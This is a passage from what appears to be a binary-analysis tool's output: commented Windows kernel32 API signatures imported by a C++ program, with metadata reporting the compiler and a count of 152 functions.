// BOOL SetEnvironmentVariableA(_In_ LPCSTR lpName, _In_opt_ LPCSTR lpValue);
// DWORD SetFilePointer(_In_ HANDLE hFile, _In_ LONG lDistanceToMove, _Inout_opt_ PLONG lpDistanceToMoveHigh, _In_ DWORD dwMoveMethod);
// UINT SetHandleCount(_In_ UINT uNumber);
// VOID SetLastError(_In_ DWORD dwErrCode);
// BOOL SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// BOOL TerminateProcess(_In_ HANDLE hProcess, _In_ UINT uExitCode);
// DWORD TlsAlloc(VOID);
// LPVOID TlsGetValue(_In_ DWORD dwTlsIndex);
// BOOL TlsSetValue(_In_ DWORD dwTlsIndex, _In_opt_ LPVOID lpTlsValue);
// LONG UnhandledExceptionFilter(_In_ struct _EXCEPTION_POINTERS * ExceptionInfo);
// LPVOID VirtualAlloc(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
// BOOL VirtualFree(LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD dwFreeType);
// int WideCharToMultiByte(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCWCH lpWideCharStr, _In_ int cchWideChar, LPSTR lpMultiByteStr, _In_ int cbMultiByte, _In_opt_ LPCCH lpDefaultChar, _Out_opt_ LPBOOL lpUsedDefaultChar);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (6.0)
// Detected language: C++
// Detected functions: 152
